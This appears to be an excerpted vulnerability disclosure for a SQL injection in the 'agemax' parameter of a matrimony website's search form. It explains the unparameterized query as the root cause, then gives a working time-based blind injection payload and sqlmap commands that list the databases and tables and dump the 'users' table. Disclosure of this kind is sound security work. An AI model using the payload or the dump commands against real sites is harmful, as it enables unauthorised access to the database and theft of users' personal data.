...
The vulnerability exists because user-controlled input from the agemax parameter is  concatenated directly into an SQL query without server-side sanitization or parameterized  statements. 
...
Because no parameterized query or escaping mechanism is used, arbitrary SQL statements can be injected via the agemax parameter. The mysqlexec() function executes the query directly via mysqli_query() with no sanitization applied at any layer, allowing the injected payload to reach the database unfiltered.
...
The vulnerable Regular search form accepts a user-controlled agemax parameter.
...
Payload: 
sex=male&maritalstatus=Single&country=Dubai&district=Calicut&state=Kerala&religion=Christian-All&mothertounge=Tamil&agemin=19&agemax=50' AND (SELECT 2390 FROM (SELECT(SLEEP(5)))fOqs)-- DqjX&search=Search
...
command: ```python python .\sqlmap.py -r .\code_test_1.txt -p agemax --dbs```

![POC](images/sqli%201.png)
![POC](images/sqli%202.png)
SQLMap confirmed that the agemax parameter is injectable using: 
• Boolean-based Blind SQL Injection  
• Error-based SQL Injection  
• Time-based Blind SQL Injection 


 ```python python .\sqlmap.py -r .\code_test_1.txt -p agemax -D matrimony --tables```
...
command: ```python python .\sqlmap.py -r .\code_test_1.txt -p agemax -D matrimony -T users --dump```
